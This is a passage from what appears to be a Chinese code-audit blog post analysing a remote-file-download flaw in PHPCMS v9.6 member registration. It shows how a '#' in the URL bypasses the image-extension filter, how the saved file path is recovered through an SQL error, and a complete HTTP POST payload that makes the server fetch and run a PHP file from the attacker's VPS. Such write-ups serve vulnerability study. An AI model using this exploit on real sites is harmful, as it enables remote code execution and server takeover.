class="variable">$field</span>, <span class="variable">$value</span>,<span class="variable">$watermark</span> = <span class="string">&#x27;0&#x27;</span>,<span class="variable">$ext</span> = <span class="string">&#x27;gif|jpg|jpeg|bmp|png&#x27;</span>, <span class="variable">$absurl</span> = <span class="string">&#x27;&#x27;</span>, <span class="variable">$basehref</span> = <span class="string">&#x27;&#x27;</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$image_d</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;att_db = pc_base::<span class="title function_ invoke__">load_model</span>(<span class="string">&#x27;attachment_model&#x27;</span>);</span><br><span class="line">    <span class="variable">$upload_url</span> = pc_base::<span class="title function_ invoke__">load_config</span>(<span class="string">&#x27;system&#x27;</span>,<span class="string">&#x27;upload_url&#x27;</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;field = <span class="variable">$field</span>;</span><br><span class="line">    <span class="variable">$dir</span> = <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Y/md/&#x27;</span>);</span><br><span class="line">    <span class="variable">$uploadpath</span> = <span class="variable">$upload_url</span>.<span class="variable">$dir</span>;</span><br><span class="line">    <span class="variable">$uploaddir</span> = <span class="variable language_">$this</span>-&gt;upload_root.<span class="variable">$dir</span>;</span><br><span class="line">    <span class="variable">$string</span> = <span class="title function_ invoke__">new_stripslashes</span>(<span class="variable">$value</span>);</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(href|src)=([\&quot;|&#x27;]?)([^ \&quot;&#x27;&gt;]+\.(<span class="subst">$ext</span>))\\2/i&quot;</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>)) <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="variable">$remotefileurls</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$matches</span>[<span class="number">3</span>] <span class="keyword">as</span> <span class="variable">$matche</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$matche</span>, <span class="string">&#x27;://&#x27;</span>) === <span class="literal">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="title function_ invoke__">dir_create</span>(<span class="variable">$uploaddir</span>);</span><br><span class="line">        <span class="variable">$remotefileurls</span>[<span class="variable">$matche</span>] = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">fillurl</span>(<span class="variable">$matche</span>, <span class="variable">$absurl</span>, <span class="variable">$basehref</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">unset</span>(<span class="variable">$matches</span>, <span class="variable">$string</span>);</span><br><span class="line">    <span class="variable">$remotefileurls</span> = <span class="title function_ invoke__">array_unique</span>(<span class="variable">$remotefileurls</span>);</span><br><span class="line">    <span class="variable">$oldpath</span> = <span class="variable">$newpath</span> = <span class="keyword">array</span>();</span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$remotefileurls</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$file</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="string">&#x27;://&#x27;</span>) === <span class="literal">false</span> || <span class="title function_ invoke__">strpos</span>(<span class="variable">$file</span>, <span class="variable">$upload_url</span>) !== <span class="literal">false</span>) <span class="keyword">continue</span>;</span><br><span class="line">        <span class="variable">$filename</span> = <span class="title function_ invoke__">fileext</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$file_name</span> = <span class="title function_ invoke__">basename</span>(<span class="variable">$file</span>);</span><br><span class="line">        <span class="variable">$filename</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">getname</span>(<span class="variable">$filename</span>);</span><br><span class="line"></span><br><span class="line">        <span class="variable">$newfile</span> = <span class="variable">$uploaddir</span>.<span class="variable">$filename</span>;</span><br><span class="line">        <span class="variable">$upload_func</span> = <span class="variable language_">$this</span>-&gt;upload_func;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$upload_func</span>(<span class="variable">$file</span>, <span class="variable">$newfile</span>)) &#123;</span><br><span class="line">            <span class="variable">$oldpath</span>[] = <span class="variable">$k</span>;</span><br><span class="line">            <span class="variable">$GLOBALS</span>[<span class="string">&#x27;downloadfiles&#x27;</span>][] = <span class="variable">$newpath</span>[] = <span class="variable">$uploadpath</span>.<span class="variable">$filename</span>;</span><br><span class="line">            @<span class="title function_ invoke__">chmod</span>(<span class="variable">$newfile</span>, <span class="number">0777</span>);</span><br><span class="line">            <span class="variable">$fileext</span> = <span class="title function_ invoke__">fileext</span>(<span class="variable">$filename</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$watermark</span>)&#123;</span><br><span class="line">                <span class="title function_ invoke__">watermark</span>(<span class="variable">$newfile</span>, <span class="variable">$newfile</span>,<span class="variable">$this</span>-&gt;siteid);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$filepath</span> = <span class="variable">$dir</span>.<span class="variable">$filename</span>;</span><br><span class="line">            <span class="variable">$downloadedfile</span> = <span class="keyword">array</span>(<span class="string">&#x27;filename&#x27;</span>=&gt;<span class="variable">$filename</span>, <span class="string">&#x27;filepath&#x27;</span>=&gt;<span class="variable">$filepath</span>, <span class="string">&#x27;filesize&#x27;</span>=&gt;<span class="title function_ invoke__">filesize</span>(<span class="variable">$newfile</span>), <span class="string">&#x27;fileext&#x27;</span>=&gt;<span class="variable">$fileext</span>);</span><br><span class="line">            <span class="variable">$aid</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">add</span>(<span class="variable">$downloadedfile</span>);</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;downloadedfiles[<span class="variable">$aid</span>] = <span class="variable">$filepath</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">str_replace</span>(<span class="variable">$oldpath</span>, <span class="variable">$newpath</span>, <span class="variable">$value</span>);</span><br><span class="line">&#125;	</span><br></pre></td></tr></table></figure>
+
+<p>他这里会进行正则匹配</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match_all</span>(<span class="string">&quot;/(href|src)=([\&quot;|&#x27;]?)([^ \&quot;&#x27;&gt;]+\.(<span class="subst">$ext</span>))\\2/i&quot;</span>, <span class="variable">$string</span>, <span class="variable">$matches</span>))</span><br></pre></td></tr></table></figure>
+
+<p>符合的字符串为<code>href=http://xxx.com/a.jpg</code>，要求结尾为<code>gif|jpg|jpeg|bmp|png</code>，所以要突破这个限制</p>
+<p>跟进<code>$this-&gt;fillurl</code></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152025697.png" title="image-20240115202544547" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152025697.png" alt="image-20240115202544547"></a></p>
+<p>关键代码为</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152026531.png" title="image-20240115202644503" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152026531.png" alt="image-20240115202644503"></a></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$pos</span> = <span class="title function_ invoke__">strpos</span>(<span class="variable">$surl</span>,<span class="string">&#x27;#&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$pos</span>&gt;<span class="number">0</span>) <span class="variable">$surl</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$surl</span>,<span class="number">0</span>,<span class="variable">$pos</span>);</span><br></pre></td></tr></table></figure>
+
+<p>他会从#处截断</p>
+<p>所以如果输入为<code>http://eeee.com/1.php#.jpg</code>，最后就会变成<code>http://eeee.com/1.php</code></p>
+<p>最后这里通过copy进行文件下载</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152029302.png" title="image-20240115202910130" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152029302.png" alt="image-20240115202910130"></a></p>
+<p>因为这里不会回显文件保存位置，所以要通过其他方式来获得文件上传后的路径</p>
+<ol>
+<li><p>通过sql报错</p>
+<p>继续执行，回到<code>phpcms/modules/member/index.php</code>的<code>register()</code>里</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="variable">$member_setting</span>[<span class="string">&#x27;choosemodel&#x27;</span>]) &#123;	<span class="comment">//如果开启选择模型</span></span><br><span class="line">    <span class="variable">$user_model_info</span>[<span class="string">&#x27;userid&#x27;</span>] = <span class="variable">$userid</span>;</span><br><span class="line">    <span class="comment">//插入会员模型数据</span></span><br><span class="line">    <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">set_model</span>(<span class="variable">$userinfo</span>[<span class="string">&#x27;modelid&#x27;</span>]);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;db-&gt;<span class="title function_ invoke__">insert</span>(<span class="variable">$user_model_info</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里会执行数据库插入操作</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152044539.png" title="image-20240115204444489" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152044539.png" alt="image-20240115204444489"></a></p>
+<p>跟进后，可以发现最后执行的sql语句为</p>
+<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> `phpcmsv9<span class="number">.6</span>`.`v9_member_detail`(`content`,`userid`) <span class="keyword">VALUES</span> (<span class="string">&#x27;href=http://192.168.91.39:8080/uploadfile/2024/0115/20240115084645518.php&#x27;</span>,<span class="string">&#x27;10&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152048038.png" title="image-20240115204852881" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152048038.png" alt="image-20240115204852881"></a></p>
+<p>但是v9_member_detail表里没有content字段，所以插入时会发生错误，而且代码里没有开启error_report(0)，所以是会回显到网页的</p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152049600.png" title="image-20240115204951504" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152049600.png" alt="image-20240115204951504"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152051970.png" title="image-20240115205148064" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152051970.png" alt="image-20240115205148064"></a></p>
+</li>
+<li><p>爆破文件名</p>
+<p>从代码里可以知道，文件名会被重命名</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getname</span>(<span class="params"><span class="variable">$fileext</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">date</span>(<span class="string">&#x27;Ymdhis&#x27;</span>).<span class="title function_ invoke__">rand</span>(<span class="number">100</span>, <span class="number">999</span>).<span class="string">&#x27;.&#x27;</span>.<span class="variable">$fileext</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>但是得一直爆，所以比较麻烦</p>
+</li>
+</ol>
+<h2 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h2><p>先在自己的vps放置php文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1 HTTP/1.1</span><br><span class="line">Host: 192.168.91.39:8080</span><br><span class="line">Content-Length: 301</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Origin: http://192.168.91.39:8080</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line">Referer: http://192.168.91.39:8080/index.php?m=member&amp;c=index&amp;a=register&amp;siteid=1</span><br><span class="line">Accept-Encoding: gzip, deflate, br</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=tvgkcdp9r9ki6n8sqit5e1cjg7; hThbk_admin_username=01946cSxjfHr5n5deaN2nq32aGPrlmwAvaC2yi3pY2YeBv8; hThbk_siteid=88f0h61ZI_oE2e35AlzIvqjdF9QDVw-64QWwFTDq; hThbk_userid=2f2bCsjotgEM32BCtAjD33IuWF9gwm3_uezNYBvp; hThbk_admin_email=50f5wvAnIMP0PXQ-AK_cWNvFpce1ZQcyuy5C6C_VfFYAEaRmSg; hThbk_sys_lang=8f14-tIiEZwLVjUjYdasxVAqYJoQsqXkzqpsn9V8TmJhtA; XDEBUG_SESSION=PHPSTORM</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">siteid=1&amp;modelid=3&amp;username=wieaane21r&amp;password=122a13456&amp;pwdconfirm=12341526&amp;email=v12ish11yanq%40ctf.dog&amp;nickname=212111123&amp;info[content]=href=http://192.168.52.1:8080/shared/wp.php#.jpg&amp;dosubmit=%E5%90%8C%E6%84%8F%E6%B3%A8%E5%86%8C%E5%8D%8F%E8%AE%AE%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152054868.png" title="image-20240115205432775" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152054868.png" alt="image-20240115205432775"></a></p>
+<p><a target="_blank" rel="noopener" href="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152054032.png" title="image-20240115205456951" class="gallery-item" style="box-shadow: none;"> <img src="https://typero-1312563978.cos.ap-shanghai.myqcloud.com/typero/202401152054032.png" alt="image-20240115205456951"></a></p>
+<p>成功代码执行</p>
+</div><script src="https://jsd.onmicrosoft.cn/npm/hexo-theme-a4@latest/source/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {
+        var options = {
+            selector: '.gallery-item'
+        };
+        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);
+        }</script>
+    </div>
+
+    <div class="post-meta">
+        <i>
+        
+            <span>2024-03-01</span>
+            
+                <span>该篇文章被 John Doe</span>
+            
+            
+                <span>打上标签:
+                    
+                    
+                        <a href='/tags/php/'>
+                            php
+                        </a>
+                    
+                </span>
+             
+             
+                <span>归为分类:
+                    
+                    
+                        <a href='/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/'>
+                            代码审计
+                        </a>
+                    
+                </span>
+            
+        
+        </i>
+    </div>
+    <br>
+    
+    <!-- <div class="post-footer-pre-next">
+        <span>上一篇：<a href=""></a></span>
+        <span class="post-footer-pre-next-last-span-right">上一篇：<a href=""></a></span>
+    </div> -->
+
+    
+        
+    <div class="comments-container">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+         
+    </div>
+    
+        
+
+    <div id="waline"></div>
+    <script type="module"  >
+        import { init } from 'https://npm.elemecdn.com/hexo-theme-a4@latest/source/js/waline.mjs'; 
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://a4-talk.vercel.app',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+                search: false, // 禁止表情包搜索
+                reaction: false, // 对文章打分
+                pageview: false, // 浏览量统计
+                comment: false, // 评论数统计
+
+                locale: {
+                    placeholder: '欢迎评论', 
+                    sofa: ''
+                },
+            });
+            
+        }
+        window.addEventListener('DOMContentLoaded', loadWaline);
+    </script>
+
+
+
+    
+    
+    
+    </div>
+
+
+     
+</div>
+
+
+
+                                      
+                    
+                    
+                    <div class="footer">
+    
+        <span> 
+            © 1949-2024 China 
+
+            
+                
+
+            
+        </span>
+    
+</div>
+<!--这是指一条线往下的内容-->
+<div class="footer-last">
+    
+            <span>🌊面朝大海，春暖花开🌸</span>
+            
+                <span class="footer-last-span-right"><i>本站由<a target="_blank" rel="noopener" href="https://hexo.io/zh-cn/index.html">Hexo</a>驱动｜使用<a target="_blank" rel="noopener" href="https://github.com/HiNinoJay/hexo-theme-A4">Hexo-theme-A4</a>主题</i></span>
+            
+    
+</div>
+
+
+    
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.0/jquery.min.js"></script>
+
+    <!--目录-->
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.7.2/jquery.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js" type="text/javascript" ></script>
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.tocify/1.9.0/javascripts/jquery.tocify.min.js" type="text/javascript" ></script>
+        
+<script src="/js/toc.js"></script>
+
+    
+
+    
+<script src="/js/randomHeaderContent.js"></script>
+
+    <!--回到顶部按钮-->
+    
+        
+<script src="/js/returnToTop.js"></script>
+
+    
+
+    
+        
+<script src="/js/returnToLastPage.js"></script>
+
+    
+
+
+
+
+
+<script src="/js/lightgallery.min.js"></script>
+
+
+
+                </div>
+            
+            
+                <!-- 回到顶部的按钮-->  
+                <div class="progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+            
+                <!-- 返回的按钮-->  
+                <div class="return-to-last-progress-wrap shadow-drop-2-bottom">
+                    <svg class="progress-circle svg-content" width="100%" height="100%" viewBox="-1 -1 102 102">
+                        <path d="M50,1 a49,49 0 0,1 0,98 a49,49 0 0,1 0,-98"/>
+                    </svg>
+                </div>
+            
+    </body>
+
+
+    <!--暗黑模式-->
+    <script src="/js/darkmode-js.min.js"></script>
+    <script>
+        function addDarkmodeWidget() {
+        const options = {
+            bottom: '53px', // default: '32px'
+            right: 'unset', // default: '32px'
+            left: '42px', // default: 'unset'
+            time: '0.3s', // default: '0.3s'
+            mixColor: '#fff', // default: '#fff'
+            backgroundColor: ' #e4e4e4  ',  // default: '#fff'
+            buttonColorDark: '#100f2c',  // default: '#100f2c'
+            buttonColorLight: '#fff', // default: '#fff'
+            saveInCookies: true, // default: true,
+            label: '🌓', // default: ''
+            autoMatchOsTheme: true // default: true
+        }
+    
+        const darkmode = new Darkmode(options);
+        darkmode.showWidget();
+        
+        }
+        window.addEventListener('load', addDarkmodeWidget);
+    </script>
+  
+</html>
